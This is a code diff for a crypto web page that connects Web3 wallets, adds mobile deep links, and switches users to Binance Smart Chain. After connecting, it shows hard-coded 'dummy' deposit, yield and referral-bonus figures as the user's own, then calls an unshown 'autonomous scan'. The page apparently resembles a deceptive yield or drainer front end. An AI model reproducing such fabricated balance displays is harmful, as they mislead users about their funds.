@@ -927,120 +927,176 @@
 
     // New multi-wallet connection function
     async function connectToWallet(walletType) {
-        if (walletSelector) walletSelector.classList.remove('active');
-
+    if (walletSelector) walletSelector.classList.remove('active');
+    
+    try {
+        let selectedProvider = null;
+        let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         
-        try {
-            let selectedProvider = null;
+        console.log("Device type:", isMobile ? "Mobile" : "Desktop");
+        console.log("Selected wallet:", walletType);
 
-            // Try to get the appropriate provider based on wallet type
-            if (walletType === 'metamask' || walletType === 'any') {
-                if (window.ethereum) {
+        // MOBILE DETECTION - Real wallet apps
+        if (isMobile) {
+            if (walletType === 'metamask') {
+                // Check if MetaMask app is installed on mobile
+                if (window.ethereum && window.ethereum.isMetaMask) {
                     selectedProvider = window.ethereum;
+                } else {
+                    // Try to open MetaMask app via deep link
+                    const deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+                    window.location.href = deepLink;
+                    statusPanel.innerHTML = "🔄 Opening MetaMask app...";
+                    return;
                 }
-            } else if (walletType === 'trust') {
+            }
+            else if (walletType === 'trust') {
+                // Trust Wallet mobile detection
                 if (window.ethereum && window.ethereum.isTrust) {
                     selectedProvider = window.ethereum;
                 } else if (window.trustWallet) {
                     selectedProvider = window.trustWallet;
+                } else {
+                    // Trust Wallet deep link
+                    const deepLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)}`;
+                    window.location.href = deepLink;
+                    statusPanel.innerHTML = "🔄 Opening Trust Wallet app...";
+                    return;
                 }
-            } else if (walletType === 'tokenpocket') {
+            }
+            else if (walletType === 'tokenpocket') {
+                // Token Pocket mobile detection
                 if (window.tp) {
                     selectedProvider = window.tp;
                 } else if (window.ethereum && window.ethereum.isTokenPocket) {
                     selectedProvider = window.ethereum;
+                } else {
+                    // Token Pocket deep link
+                    const deepLink = `tpoutside://main?url=${encodeURIComponent(window.location.href)}`;
+                    window.location.href = deepLink;
+                    statusPanel.innerHTML = "🔄 Opening Token Pocket app...";
+                    return;
                 }
-            } else if (walletType === 'phantom') {
+            }
+            else if (walletType === 'phantom') {
+                // Phantom mobile detection
                 if (window.phantom && window.phantom.ethereum) {
                     selectedProvider = window.phantom.ethereum;
                 } else if (window.ethereum && window.ethereum.isPhantom) {
                     selectedProvider = window.ethereum;
+                } else {
+                    // Phantom deep link
+                    const deepLink = `phantom://browse?url=${encodeURIComponent(window.location.href)}`;
+                    window.location.href = deepLink;
+                    statusPanel.innerHTML = "🔄 Opening Phantom app...";
+                    return;
                 }
-            } else if (walletType === 'walletconnect') {
-                statusPanel.innerHTML = "⚠️ WalletConnect integration coming soon. Please use another wallet for now.";
+            }
+            else if (walletType === 'walletconnect') {
+                statusPanel.innerHTML = "📱 Opening WalletConnect...";
+                // For WalletConnect we'd need to implement the actual WalletConnect protocol
+                // This would require additional libraries
+                statusPanel.innerHTML = "⚠️ WalletConnect coming soon. Please use another wallet.";
                 return;
             }
+        }
 
-            if (!selectedProvider) {
-                // If specific wallet not found, try to use any available Ethereum provider
-                if (window.ethereum) {
-                    selectedProvider = window.ethereum;
-                } else {
-                    throw new Error(`Please install ${walletType} wallet or use another wallet option`);
+        // DESKTOP or Fallback detection
+        if (!selectedProvider) {
+            if (walletType === 'metamask' && window.ethereum) {
+                selectedProvider = window.ethereum;
+            } else if (walletType === 'trust' && window.ethereum && window.ethereum.isTrust) {
+                selectedProvider = window.ethereum;
+            } else if (walletType === 'tokenpocket' && (window.tp || (window.ethereum && window.ethereum.isTokenPocket))) {
+                selectedProvider = window.tp || window.ethereum;
+            } else if (walletType === 'phantom' && (window.phantom?.ethereum || (window.ethereum && window.ethereum.isPhantom))) {
+                selectedProvider = window.phantom?.ethereum || window.ethereum;
+            } else if (walletType === 'any' && window.ethereum) {
+                selectedProvider = window.ethereum;
+            }
+        }
+
+        if (!selectedProvider && !isMobile) {
+            // On desktop, show installation links
+            const installUrls = {
+                'metamask': 'https://metamask.io/download/',
+                'trust': 'https://trustwallet.com/download',
+                'tokenpocket': 'https://www.tokenpocket.pro/en/download/app',
+                'phantom': 'https://phantom.app/download'
+            };
+            
+            if (installUrls[walletType]) {
+                if (confirm(`${walletType} wallet not detected. Would you like to install it?`)) {
+                    window.open(installUrls[walletType], '_blank');
                 }
             }
+            throw new Error(`Please install ${walletType} wallet or use another wallet option`);
+        }
 
-            provider = new ethers.providers.Web3Provider(selectedProvider);
-            
-            // Check if we're on BSC network
-            try {
-                const network = await provider.getNetwork();
-                if (network.chainId !== 56) {
-                    statusPanel.innerHTML = "🔄 Switching to Binance Smart Chain (BSC) network...";
-                    try {
+        if (!selectedProvider) {
+            throw new Error(`No wallet detected. Please make sure ${walletType} is installed and enabled.`);
+        }
+
+        // Initialize provider
+        provider = new ethers.providers.Web3Provider(selectedProvider);
+        
+        // Request accounts
+        const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
+        signer = provider.getSigner();
+        userAddress = accounts[0];
+        
+        // Check BSC network
+        try {
+            const network = await provider.getNetwork();
+            if (network.chainId !== 56) {
+                statusPanel.innerHTML = "🔄 Switching to Binance Smart Chain...";
+                try {
+                    await selectedProvider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }]
+                    });
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
                         await selectedProvider.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: '0x38' }], // BSC chainId in hex
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'Binance Smart Chain',
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                blockExplorerUrls: ['https://bscscan.com/']
+                            }]
                         });
-                    } catch (switchError) {
-                        // If chain not added, try to add it
-                        if (switchError.code === 4902) {
-                            try {
-                                await selectedProvider.request({
-                                    method: 'wallet_addEthereumChain',
-                                    params: [{
-                                        chainId: '0x38',
-                                        chainName: 'Binance Smart Chain',
-                                        nativeCurrency: {
-                                            name: 'BNB',
-                                            symbol: 'BNB',
-                                            decimals: 18
-                                        },
-                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                        blockExplorerUrls: ['https://bscscan.com/']
-                                    }]
-                                });
-                            } catch (addError) {
-                                console.log("Could not add BSC network");
-                            }
-                        }
                     }
                 }
-            } catch (networkError) {
-                console.log("Network check error:", networkError);
             }
-
-            const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
-            signer = provider.getSigner();
-            userAddress = accounts[0];
-            
-            // Update UI
-            walletConnectBtn.innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-            walletConnectBtn.disabled = true;
-            
-            // Update dummy data after connection
-            setTimeout(() => {
-                document.getElementById('nftTier').textContent = 'DIAMOND';
-                document.getElementById('nftMultiplier').textContent = '2.5x';
-                document.getElementById('nftBoost').textContent = '+12%';
-                document.getElementById('myDeposit').textContent = '$4,250';
-                document.getElementById('availableYield').textContent = '$212.50';
-                document.getElementById('refBonus').textContent = '$24,567.89';
-                document.getElementById('matrixLevel').textContent = 'L5';
-            }, 2000);
-            
-            await runAutonomousScan();
-            
-        } catch (e) {
-            console.error(e);
-            if (e.code === 4001) {
-                statusPanel.innerHTML = "❌ Connection cancelled. Please try again.";
-            } else {
-                statusPanel.innerHTML = e.message || "❌ Connection failed. Please try again.";
-            }
-            walletConnectBtn.disabled = false;
+        } catch (networkError) {
+            console.log("Network check error:", networkError);
         }
+        
+        // Update UI
+        walletConnectBtn.innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+        walletConnectBtn.disabled = true;
+        
+        // Update dummy data
+        setTimeout(() => {
+            document.getElementById('nftTier').textContent = 'DIAMOND';
+            document.getElementById('nftMultiplier').textContent = '2.5x';
+            document.getElementById('nftBoost').textContent = '+12%';
+            document.getElementById('myDeposit').textContent = '$4,250';
+            document.getElementById('availableYield').textContent = '$212.50';
+            document.getElementById('refBonus').textContent = '$24,567.89';
+            document.getElementById('matrixLevel').textContent = 'L5';
+        }, 2000);
+        
+        await runAutonomousScan();
+        
+    } catch (e) {
+        console.error(e);
+        statusPanel.innerHTML = e.message || "❌ Connection failed. Please try again.";
+        walletConnectBtn.disabled = false;
     }
+}
 
     // Modified connectWallet function now opens modal
     async function connectWallet() {
@@ -1055,7 +1111,7 @@
             await connectToWallet('any');
         }
     }
-
+    
     async function runAutonomousScan() {
         if (isScanning) return;
         isScanning = true;
@@ -1243,8 +1299,11 @@ if (cancelWallet) {
         connectPhantom.addEventListener('click', () => connectToWallet('phantom'));
     }
     if (connectWalletConnect) {
-        connectWalletConnect.addEventListener('click', () => connectToWallet('walletconnect'));
-    }
+    connectWalletConnect.addEventListener('click', () => {
+        statusPanel.innerHTML = "⚠️ WalletConnect coming soon. Please use MetaMask or Trust Wallet on mobile.";
+        // Keep modal open so user can choose another wallet
+    });
+}
 
     bonusBtn.addEventListener('click', handleClaim);
     
